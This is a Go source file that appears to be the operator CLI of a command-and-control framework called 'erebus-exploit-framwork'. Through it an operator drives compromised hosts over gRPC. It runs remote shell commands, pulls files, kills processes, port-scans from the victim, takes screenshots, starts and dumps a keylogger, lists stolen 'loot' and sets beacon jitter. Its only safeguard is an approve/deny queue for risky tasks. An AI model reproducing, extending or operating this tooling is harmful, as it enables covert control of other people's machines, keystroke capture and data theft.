package main

import (
	"context"
	"fmt"
	"strconv"
	"strings"
	"time"

	pb "github.com/KKingZero/erebus-exploit-framwork/pkg/pb"
	"google.golang.org/protobuf/proto"
)

type CommandHandler func(args []string) error

type Commands struct {
	client    pb.ErebusC2Client
	sessionID string // active session
}

func NewCommands(client pb.ErebusC2Client) *Commands {
	return &Commands{client: client}
}

func (c *Commands) Handlers() map[string]CommandHandler {
	return map[string]CommandHandler{
		"sessions":  c.cmdSessions,
		"use":       c.cmdUse,
		"shell":     c.cmdShell,
		"upload":    c.cmdUpload,
		"download":  c.cmdDownload,
		"ps":        c.cmdPS,
		"kill":      c.cmdKill,
		"ifconfig":  c.cmdIfconfig,
		"portscan":  c.cmdPortscan,
		"sleep":     c.cmdSleep,
		"tasks":     c.cmdTasks,
		"result":    c.cmdResult,
		"loot":      c.cmdLoot,
		"events":    c.cmdEvents,
		"listeners": c.cmdListeners,
		"approve":   c.cmdApprove,
		"deny":      c.cmdDeny,
		"pending":   c.cmdPending,
		"screenshot": c.cmdScreenshot,
		"keylog":    c.cmdKeylog,
		"inject":    c.cmdInject,
		"exit":      c.cmdExit,
		"help":      c.cmdHelp,
	}
}

// ctx returns a context with timeout. The cancel function is called internally
// when the context times out; for short-lived RPCs this is acceptable.
func (c *Commands) ctx() (context.Context, context.CancelFunc) {
	return context.WithTimeout(context.Background(), 60*time.Second)
}

func (c *Commands) requireSession() error {
	if c.sessionID == "" {
		return fmt.Errorf("no active session - use 'use <session-id>'")
	}
	return nil
}

func (c *Commands) cmdSessions(_ []string) error {
	ctx, cancel := c.ctx()
	defer cancel()
	resp, err := c.client.ListSessions(ctx, &pb.ListSessionsRequest{})
	if err != nil {
		return err
	}
	if len(resp.Sessions) == 0 {
		fmt.Println("No active sessions")
		return nil
	}
	fmt.Printf("%-36s %-15s %-12s %-8s %-10s %-6s\n", "SESSION", "HOSTNAME", "USER", "OS", "TRANSPORT", "ALIVE")
	for _, s := range resp.Sessions {
		alive := "yes"
		if !s.Alive {
			alive = "no"
		}
		fmt.Printf("%-36s %-15s %-12s %-8s %-10s %-6s\n",
			s.SessionId, s.Hostname, s.Username, s.Os, s.Transport, alive)
	}
	return nil
}

func (c *Commands) cmdUse(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: use <session-id>")
	}
	c.sessionID = args[0]
	fmt.Printf("Active session: %s\n", c.sessionID)
	return nil
}

func (c *Commands) executeTask(taskType pb.TaskType, data []byte, wait bool) (*pb.ExecuteTaskResponse, error) {
	if err := c.requireSession(); err != nil {
		return nil, err
	}
	ctx, cancel := c.ctx()
	defer cancel()
	return c.client.ExecuteTask(ctx, &pb.ExecuteTaskRequest{
		SessionId: c.sessionID,
		TaskType:  taskType,
		Data:      data,
		Wait:      wait,
		TimeoutMs: 30000,
	})
}

func (c *Commands) cmdShell(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: shell <command>")
	}
	cmd := strings.Join(args, " ")
	data, _ := proto.Marshal(&pb.ShellTask{Command: cmd})

	resp, err := c.executeTask(pb.TaskType_TASK_SHELL, data, true)
	if err != nil {
		return err
	}
	if resp.Result != nil {
		if resp.Result.Success {
			result := &pb.ShellResult{}
			proto.Unmarshal(resp.Result.Data, result)
			if result.Stdout != "" {
				fmt.Print(result.Stdout)
			}
			if result.Stderr != "" {
				fmt.Printf("[stderr] %s", result.Stderr)
			}
		} else {
			fmt.Printf("Error: %s\n", resp.Result.Error)
		}
	}
	return nil
}

func (c *Commands) cmdUpload(args []string) error {
	if len(args) < 2 {
		return fmt.Errorf("usage: upload <local-path> <remote-path>")
	}
	// Read would need os.ReadFile but we keep it simple for CLI
	return fmt.Errorf("upload: use the gRPC API directly for file uploads")
}

func (c *Commands) cmdDownload(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: download <remote-path>")
	}
	data, _ := proto.Marshal(&pb.FileDownloadTask{RemotePath: args[0]})
	resp, err := c.executeTask(pb.TaskType_TASK_FILE_DOWNLOAD, data, true)
	if err != nil {
		return err
	}
	if resp.Result != nil && resp.Result.Success {
		result := &pb.FileDownloadResult{}
		proto.Unmarshal(resp.Result.Data, result)
		fmt.Printf("Downloaded %s (%d bytes)\n", result.Filename, len(result.Data))
	}
	return nil
}

func (c *Commands) cmdPS(_ []string) error {
	resp, err := c.executeTask(pb.TaskType_TASK_PROCESS_LIST, nil, true)
	if err != nil {
		return err
	}
	if resp.Result != nil && resp.Result.Success {
		result := &pb.ProcessListResult{}
		proto.Unmarshal(resp.Result.Data, result)
		fmt.Printf("%-8s %-8s %-20s %-10s\n", "PID", "PPID", "NAME", "USER")
		for _, p := range result.Processes {
			fmt.Printf("%-8d %-8d %-20s %-10s\n", p.Pid, p.Ppid, p.Name, p.User)
		}
	}
	return nil
}

func (c *Commands) cmdKill(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: kill <pid>")
	}
	pid, err := strconv.ParseUint(args[0], 10, 32)
	if err != nil {
		return fmt.Errorf("invalid PID: %s", args[0])
	}
	data, _ := proto.Marshal(&pb.ProcessKillTask{Pid: uint32(pid)})
	resp, err := c.executeTask(pb.TaskType_TASK_PROCESS_KILL, data, true)
	if err != nil {
		return err
	}
	if resp.Result != nil && resp.Result.Success {
		fmt.Printf("Process %d killed\n", pid)
	}
	return nil
}

func (c *Commands) cmdIfconfig(_ []string) error {
	resp, err := c.executeTask(pb.TaskType_TASK_NET_IFCONFIG, nil, true)
	if err != nil {
		return err
	}
	if resp.Result != nil && resp.Result.Success {
		result := &pb.NetIfconfigResult{}
		proto.Unmarshal(resp.Result.Data, result)
		for _, iface := range result.Interfaces {
			status := "down"
			if iface.Up {
				status = "up"
			}
			fmt.Printf("%s (%s) MTU=%d %s\n", iface.Name, iface.Mac, iface.Mtu, status)
			for _, addr := range iface.Addresses {
				fmt.Printf("  %s\n", addr)
			}
		}
	}
	return nil
}

func (c *Commands) cmdPortscan(args []string) error {
	if len(args) < 2 {
		return fmt.Errorf("usage: portscan <target> <port1,port2,...>")
	}
	var ports []uint32
	for _, p := range strings.Split(args[1], ",") {
		port, err := strconv.ParseUint(strings.TrimSpace(p), 10, 32)
		if err != nil {
			return fmt.Errorf("invalid port: %s", p)
		}
		ports = append(ports, uint32(port))
	}
	data, _ := proto.Marshal(&pb.NetPortscanTask{
		Target:    args[0],
		Ports:     ports,
		TimeoutMs: 2000,
		Threads:   10,
	})
	resp, err := c.executeTask(pb.TaskType_TASK_NET_PORTSCAN, data, true)
	if err != nil {
		return err
	}
	if resp.Result != nil && resp.Result.Success {
		result := &pb.NetPortscanResult{}
		proto.Unmarshal(resp.Result.Data, result)
		for _, pr := range result.Ports {
			status := "closed"
			if pr.Open {
				status = "open"
			}
			svc := ""
			if pr.Service != "" {
				svc = " (" + pr.Service + ")"
			}
			fmt.Printf("%s:%d %s%s\n", pr.Host, pr.Port, status, svc)
		}
	}
	return nil
}

func (c *Commands) cmdSleep(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: sleep <ms> [jitter-pct]")
	}
	ms, err := strconv.ParseInt(args[0], 10, 64)
	if err != nil {
		return fmt.Errorf("invalid sleep ms: %s", args[0])
	}
	var jitter int32
	if len(args) > 1 {
		j, err := strconv.ParseInt(args[1], 10, 32)
		if err != nil {
			return fmt.Errorf("invalid jitter: %s", args[1])
		}
		jitter = int32(j)
	}
	data, _ := proto.Marshal(&pb.SleepTask{SleepMs: ms, JitterPct: jitter})
	resp, err := c.executeTask(pb.TaskType_TASK_SLEEP, data, false)
	if err != nil {
		return err
	}
	fmt.Printf("Sleep task queued: %s\n", resp.TaskId)
	return nil
}

func (c *Commands) cmdTasks(_ []string) error {
	if err := c.requireSession(); err != nil {
		return err
	}
	ctx, cancel := c.ctx()
	defer cancel()
	resp, err := c.client.ListTasks(ctx, &pb.ListTasksRequest{SessionId: c.sessionID})
	if err != nil {
		return err
	}
	if len(resp.Tasks) == 0 {
		fmt.Println("No tasks")
		return nil
	}
	fmt.Printf("%-20s %-20s\n", "TASK ID", "TYPE")
	for _, t := range resp.Tasks {
		fmt.Printf("%-20s %-20s\n", t.TaskId, t.TaskType)
	}
	return nil
}

func (c *Commands) cmdResult(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: result <task-id>")
	}
	ctx, cancel := c.ctx()
	defer cancel()
	resp, err := c.client.GetTaskResult(ctx, &pb.GetTaskResultRequest{TaskId: args[0]})
	if err != nil {
		return err
	}
	if resp.Pending {
		fmt.Println("Task is still pending")
		return nil
	}
	if resp.Result != nil {
		fmt.Printf("Success: %v\n", resp.Result.Success)
		if resp.Result.Error != "" {
			fmt.Printf("Error: %s\n", resp.Result.Error)
		}
		fmt.Printf("Execution time: %dms\n", resp.Result.ExecutionTimeMs)
	}
	return nil
}

func (c *Commands) cmdLoot(_ []string) error {
	ctx, cancel := c.ctx()
	defer cancel()
	resp, err := c.client.ListLoot(ctx, &pb.ListLootRequest{SessionId: c.sessionID})
	if err != nil {
		return err
	}
	if len(resp.Items) == 0 {
		fmt.Println("No loot")
		return nil
	}
	for _, item := range resp.Items {
		fmt.Printf("[%s] %s from %s (%d bytes)\n", item.Type, item.Id, item.Source, len(item.Data))
	}
	return nil
}

func (c *Commands) cmdEvents(_ []string) error {
	stream, err := c.client.Subscribe(context.Background(), &pb.SubscribeRequest{})
	if err != nil {
		return err
	}
	fmt.Println("Listening for events (Ctrl+C to stop)...")
	for {
		event, err := stream.Recv()
		if err != nil {
			return err
		}
		fmt.Printf("[%s] %s (session=%s task=%s)\n",
			event.Type, event.Message, event.SessionId, event.TaskId)
	}
}

func (c *Commands) cmdListeners(_ []string) error {
	ctx, cancel := c.ctx()
	defer cancel()
	resp, err := c.client.ListListeners(ctx, &pb.ListListenersRequest{})
	if err != nil {
		return err
	}
	if len(resp.Listeners) == 0 {
		fmt.Println("No listeners")
		return nil
	}
	for _, l := range resp.Listeners {
		active := "inactive"
		if l.Active {
			active = "active"
		}
		fmt.Printf("[%s] %s %s %s (%s)\n", l.Id, l.Name, l.Protocol, l.Address, active)
	}
	return nil
}

func (c *Commands) cmdApprove(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: approve <approval-id>")
	}
	ctx, cancel := c.ctx()
	defer cancel()
	resp, err := c.client.Approve(ctx, &pb.ApproveRequest{ApprovalId: args[0]})
	if err != nil {
		return err
	}
	if resp.Success {
		fmt.Println("Approved")
	}
	return nil
}

func (c *Commands) cmdDeny(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: deny <approval-id> [reason]")
	}
	reason := ""
	if len(args) > 1 {
		reason = strings.Join(args[1:], " ")
	}
	ctx, cancel := c.ctx()
	defer cancel()
	resp, err := c.client.Deny(ctx, &pb.DenyRequest{ApprovalId: args[0], Reason: reason})
	if err != nil {
		return err
	}
	if resp.Success {
		fmt.Println("Denied")
	}
	return nil
}

func (c *Commands) cmdPending(_ []string) error {
	ctx, cancel := c.ctx()
	defer cancel()
	resp, err := c.client.ListPendingApprovals(ctx, &pb.ListPendingApprovalsRequest{})
	if err != nil {
		return err
	}
	if len(resp.Approvals) == 0 {
		fmt.Println("No pending approvals")
		return nil
	}
	for _, a := range resp.Approvals {
		fmt.Printf("[%s] %s session=%s type=%s risk=%s\n",
			a.Id, a.TaskDescription, a.SessionId, a.TaskType, a.RiskLevel)
	}
	return nil
}

func (c *Commands) cmdScreenshot(_ []string) error {
	resp, err := c.executeTask(pb.TaskType_TASK_SCREENSHOT, nil, true)
	if err != nil {
		return err
	}
	if resp.Result != nil && resp.Result.Success {
		result := &pb.ScreenshotResult{}
		proto.Unmarshal(resp.Result.Data, result)
		fmt.Printf("Screenshot: %dx%d %s (%d bytes)\n", result.Width, result.Height, result.Format, len(result.ImageData))
	}
	return nil
}

func (c *Commands) cmdKeylog(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: keylog <start|stop|dump>")
	}
	switch args[0] {
	case "start":
		data, _ := proto.Marshal(&pb.KeylogStartTask{CaptureWindowTitles: true})
		_, err := c.executeTask(pb.TaskType_TASK_KEYLOG_START, data, false)
		if err != nil {
			return err
		}
		fmt.Println("Keylogger started")
	case "stop":
		_, err := c.executeTask(pb.TaskType_TASK_KEYLOG_STOP, nil, false)
		if err != nil {
			return err
		}
		fmt.Println("Keylogger stopped")
	case "dump":
		resp, err := c.executeTask(pb.TaskType_TASK_KEYLOG_DUMP, nil, true)
		if err != nil {
			return err
		}
		if resp.Result != nil && resp.Result.Success {
			result := &pb.KeylogDumpResult{}
			proto.Unmarshal(resp.Result.Data, result)
			for _, entry := range result.Entries {
				fmt.Printf("[%s] %s\n", entry.WindowTitle, entry.Keys)
			}
		}
	default:
		return fmt.Errorf("usage: keylog <start|stop|dump>")
	}
	return nil
}

func (c *Commands) cmdInject(args []string) error {
	return fmt.Errorf("inject: use the gRPC API directly for binary injection payloads")
}

func (c *Commands) cmdExit(_ []string) error {
	fmt.Println("Goodbye")
	return errExit
}

var errExit = fmt.Errorf("exit")

func (c *Commands) cmdHelp(_ []string) error {
	fmt.Println(`Commands:
  sessions              - List active sessions
  use <session-id>      - Select active session
  shell <command>       - Execute shell command
  upload <local> <remote> - Upload file
  download <remote>     - Download file
  ps                    - List processes
  kill <pid>            - Kill process
  ifconfig              - List network interfaces
  portscan <host> <ports> - TCP port scan
  sleep <ms> [jitter]   - Set beacon interval
  screenshot            - Take screenshot
  keylog <start|stop|dump> - Keylogger control
  tasks                 - List session tasks
  result <task-id>      - Get task result
  loot                  - List loot
  events                - Stream events
  listeners             - List listeners
  pending               - List pending approvals
  approve <id>          - Approve operation
  deny <id> [reason]    - Deny operation
  exit                  - Exit operator CLI
  help                  - Show this help`)
	return nil
}
